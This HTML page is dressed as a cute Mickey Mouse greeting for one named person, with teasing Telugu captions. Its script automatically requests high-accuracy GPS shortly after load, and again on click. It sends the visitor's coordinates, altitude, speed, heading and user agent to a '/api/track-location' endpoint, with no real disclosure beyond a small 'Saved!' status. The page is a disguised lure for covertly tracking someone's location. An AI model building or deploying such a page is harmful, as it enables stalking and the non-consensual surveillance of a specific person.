<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Potti Megnana Golivi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            font-style: normal;
            background: linear-gradient(135deg, #ff6b6b 0%, #ffd93d 50%, #6bcb77 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 30px;
            max-width: 500px;
            width: 100%;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: -50px;
            right: -50px;
            width: 150px;
            height: 150px;
            background: radial-gradient(circle, #ffd93d 10%, transparent 10%);
            background-size: 30px 30px;
            opacity: 0.2;
            border-radius: 50%;
        }
        
        .mickey-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .mickey-ears {
            display: flex;
            justify-content: center;
            gap: 80px;
            margin-bottom: -30px;
            position: relative;
            z-index: 1;
        }
        
        .ear { width: 60px; height: 60px; background: #1a1a2e; border-radius: 50%; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        
        .mickey-face {
            width: 150px; height: 150px; background: #1a1a2e; border-radius: 50%;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            position: relative; z-index: 2; box-shadow: 0 8px 25px rgba(0,0,0,0.3);
        }
        
        .mickey-eyes { display: flex; gap: 30px; margin-top: 10px; }
        .eye { width: 25px; height: 30px; background: white; border-radius: 50%; position: relative; }
        .eye::after {
            content: ''; width: 12px; height: 15px; background: #1a1a2e;
            border-radius: 50%; position: absolute; bottom: 5px; left: 6px;
        }
        .mickey-nose { width: 25px; height: 20px; background: #ff6b6b; border-radius: 50%; margin-top: 5px; box-shadow: 0 2px 10px rgba(255,107,107,0.5); }
        .mickey-mouth { width: 40px; height: 15px; border-bottom: 3px solid white; border-radius: 0 0 50% 50%; margin-top: 5px; }
        
        h1 { 
            color: #1a1a2e; 
            margin: 15px 0 5px; 
            font-size: 1.8rem; 
            text-shadow: 2px 2px 0 #ffd93d;
            font-weight: 700;
            font-style: normal;
        }
        
        .subtitle { 
            color: #666; 
            font-size: 0.9rem; 
            margin-bottom: 20px;
            font-weight: 400;
            font-style: normal;
        }
        
        .gps-badge {
            display: inline-block;
            background: #28a745;
            color: white;
            padding: 4px 15px;
            border-radius: 20px;
            font-size: 0.8rem;
            margin-bottom: 10px;
            font-weight: 500;
            font-style: normal;
        }
        
        .mickey-image {
            margin: 15px 0;
            cursor: pointer;
            transition: transform 0.3s ease;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            background: linear-gradient(135deg, #ffd93d, #ff6b6b);
            padding: 20px;
        }
        
        .mickey-image:hover { transform: scale(1.02); }
        
        .mickey-image img {
            width: 200px; height: 200px; display: block; margin: 0 auto;
            border-radius: 50%; background: white; padding: 10px;
        }
        
        .click-hint { 
            color: #1a1a2e; 
            font-weight: 600; 
            margin-top: 10px; 
            animation: bounce 2s infinite;
            font-style: normal;
        }
        
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
        
        .btn {
            display: inline-block; 
            padding: 12px 25px; 
            border: none; 
            border-radius: 50px;
            font-size: 0.95rem; 
            cursor: pointer; 
            text-decoration: none; 
            transition: all 0.3s ease;
            font-weight: 600; 
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            font-style: normal;
            margin: 5px; 
            width: 100%;
        }
        
        .btn-view-excel { background: #17a2b8; color: white; }
        .btn-view-excel:hover { background: #138496; transform: scale(1.02); }
        .btn-refresh { background: #ffd93d; color: #1a1a2e; }
        .btn-refresh:hover { background: #f9c900; transform: scale(1.02); }
        
        .button-group { display: flex; flex-direction: column; gap: 10px; margin-top: 15px; }
        
        .excel-count { 
            background: #e7f3ff; 
            padding: 8px 15px; 
            border-radius: 20px; 
            display: inline-block; 
            font-size: 0.85rem; 
            color: #004085; 
            margin-top: 15px;
            font-weight: 500;
            font-style: normal;
        }
        
        footer { 
            margin-top: 20px; 
            padding-top: 15px; 
            border-top: 2px dashed #dee2e6; 
            color: #6c757d; 
            font-size: 0.8rem;
            font-style: normal;
            font-weight: 400;
        }
        
        .loading-spinner {
            display: none; 
            width: 30px; 
            height: 30px; 
            border: 3px solid #f3f3f3;
            border-top: 3px solid #ff6b6b; 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
            margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-spinner.active { display: block; }
        
        .gps-accuracy {
            display: none;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 0.85rem;
            margin: 10px 0;
            font-weight: 500;
            font-style: normal;
        }
        .gps-accuracy.excellent { background: #d4edda; color: #155724; display: block; }
        .gps-accuracy.good { background: #d1ecf1; color: #0c5460; display: block; }
        .gps-accuracy.poor { background: #fff3cd; color: #856404; display: block; }
        .gps-accuracy.unknown { background: #f8d7da; color: #721c24; display: block; }
        
        @media (max-width: 600px) {
            .container { padding: 20px; }
            .mickey-face { width: 120px; height: 120px; }
            .mickey-eyes { gap: 20px; }
            .eye { width: 20px; height: 25px; }
            .ear { width: 45px; height: 45px; }
            .mickey-ears { gap: 60px; }
            h1 { font-size: 1.4rem; }
            .mickey-image img { width: 150px; height: 150px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="mickey-header">
            <div class="mickey-ears"><div class="ear"></div><div class="ear"></div></div>
            <div class="mickey-face">
                <div class="mickey-eyes"><div class="eye"></div><div class="eye"></div></div>
                <div class="mickey-nose"></div>
                <div class="mickey-mouth"></div>
            </div>
        </div>
        
        <h1>🐭 Megnana Golivi (Potti/Chitti)</h1>
        <p class="subtitle">Already i catch you <strong>Papam Trinadh ikkada</strong></p>
        <span class="gps-badge">📡 Potti pilla</span>
        
        <div class="mickey-image" onclick="manualFetchLocation()">
            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 200'%3E%3Ccircle cx='100' cy='100' r='90' fill='%23f5f5f5'/%3E%3Ccircle cx='50' cy='50' r='40' fill='%231a1a2e'/%3E%3Ccircle cx='150' cy='50' r='40' fill='%231a1a2e'/%3E%3Ccircle cx='100' cy='110' r='70' fill='%231a1a2e'/%3E%3Ccircle cx='70' cy='95' r='15' fill='white'/%3E%3Ccircle cx='130' cy='95' r='15' fill='white'/%3E%3Ccircle cx='75' cy='100' r='7' fill='%231a1a2e'/%3E%3Ccircle cx='125' cy='100' r='7' fill='%231a1a2e'/%3E%3Cellipse cx='100' cy='120' rx='12' ry='8' fill='%23ff6b6b'/%3E%3Cpath d='M85 130 Q100 140 115 130' stroke='white' stroke-width='3' fill='none'/%3E%3C/svg%3E" 
                 alt="Potti Megnana Golivi" id="mickeyImage" title="Click hahahaha😆" />
            <div class="click-hint">👆 Click </div>
        </div>
        
        <div id="gpsAccuracy" class="gps-accuracy unknown">📡 Waiting for GPS...</div>
        
        <div class="loading-spinner" id="loadingSpinner"></div>
        
        <div class="excel-count" id="locationCount">📊 dhorikipoyav papam</div>
        
        <footer>
            <p>🐭 Micky for you potti</p>
            <p style="font-size: 11px; margin-top: 5px;">📍 Accuracy depends on device GPS signal</p>
        </footer>
    </div>
    
    <script>
        let autoFetched = false;
        
        function updateLocationCount() {
            fetch('/api/count')
                .then(res => res.json())
                .then(result => {
                    if (result.success) {
                        document.getElementById('locationCount').textContent = 
                            `📊 Intellegent vi nuv`;
                    }
                })
                .catch(() => {});
        }
        
        function getExactLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('GPS not supported on this device'));
                    return;
                }
                
                const options = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const coords = position.coords;
                        resolve({
                            latitude: coords.latitude,
                            longitude: coords.longitude,
                            accuracy: Math.round(coords.accuracy),
                            altitude: coords.altitude ? Math.round(coords.altitude) : null,
                            speed: coords.speed ? coords.speed : null,
                            heading: coords.heading ? Math.round(coords.heading) : null,
                            source: 'GPS',
                            timestamp: new Date().toISOString()
                        });
                    },
                    (error) => {
                        let message = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                message = 'Location permission denied. Please allow GPS access.';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                message = 'GPS signal unavailable. Try moving to an open area.';
                                break;
                            case error.TIMEOUT:
                                message = 'GPS timed out. Try again.';
                                break;
                            default:
                                message = 'GPS error: ' + error.message;
                        }
                        reject(new Error(message));
                    },
                    options
                );
            });
        }
        
        async function autoFetchLocation() {
            if (autoFetched) return;
            
            document.getElementById('gpsAccuracy').className = 'gps-accuracy unknown';
            document.getElementById('gpsAccuracy').textContent = '📡 Getting GPS signal...';
            
            try {
                const location = await getExactLocation();
                if (!location) throw new Error('No GPS signal');
                
                showAccuracy(location.accuracy);
                
                const response = await fetch('/api/track-location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        latitude: location.latitude,
                        longitude: location.longitude,
                        accuracy: location.accuracy,
                        altitude: location.altitude,
                        speed: location.speed,
                        heading: location.heading,
                        source: 'GPS',
                        userAgent: navigator.userAgent,
                        autoFetched: true
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    updateLocationCount();
                    autoFetched = true;
                    console.log('✅ Exact GPS :', location.latitude, location.longitude);
                    document.getElementById('gpsAccuracy').textContent += ' ✅ Saved!';
                } else {
                    throw new Error(result.message || 'Save failed');
                }
            } catch (error) {
                console.error('GPS error:', error);
                document.getElementById('gpsAccuracy').className = 'gps-accuracy unknown';
                document.getElementById('gpsAccuracy').textContent = '❌ ' + error.message;
                autoFetched = false;
            }
        }
        
        async function manualFetchLocation() {
            autoFetched = false;
            
            document.getElementById('loadingSpinner').classList.add('active');
            document.getElementById('gpsAccuracy').className = 'gps-accuracy unknown';
            document.getElementById('gpsAccuracy').textContent = '📡 Getting GPS signal...';
            
            try {
                const location = await getExactLocation();
                if (!location) throw new Error('No GPS signal');
                
                showAccuracy(location.accuracy);
                
                const response = await fetch('/api/track-location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        latitude: location.latitude,
                        longitude: location.longitude,
                        accuracy: location.accuracy,
                        altitude: location.altitude,
                        speed: location.speed,
                        heading: location.heading,
                        source: 'GPS',
                        userAgent: navigator.userAgent,
                        autoFetched: false
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    updateLocationCount();
                    autoFetched = true;
                    document.getElementById('gpsAccuracy').textContent += ' ✅ Saved!';
                } else {
                    throw new Error(result.message || 'Save failed');
                }
            } catch (error) {
                console.error('GPS error:', error);
                document.getElementById('gpsAccuracy').className = 'gps-accuracy unknown';
                document.getElementById('gpsAccuracy').textContent = '❌ ' + error.message;
                autoFetched = false;
            } finally {
                document.getElementById('loadingSpinner').classList.remove('active');
            }
        }
        
        function showAccuracy(accuracy) {
            const el = document.getElementById('gpsAccuracy');
            let text = `🎯 Accuracy: ${accuracy} meters`;
            
            if (accuracy < 10) {
                el.className = 'gps-accuracy excellent';
                text += ' - Excellent! 🎯';
            } else if (accuracy < 30) {
                el.className = 'gps-accuracy good';
                text += ' - Good 👍';
            } else if (accuracy < 100) {
                el.className = 'gps-accuracy poor';
                text += ' - Poor 📡';
            } else {
                el.className = 'gps-accuracy unknown';
                text += ' - Weak signal 📶';
            }
            
            el.textContent = text;
            el.style.display = 'block';
        }
        
        window.addEventListener('load', () => {
            console.log('🐭 Potti Megnana Golivi ');
            updateLocationCount();
            
            setTimeout(() => {
                autoFetchLocation();
            }, 1500);
        });
    </script>
</body>
</html>
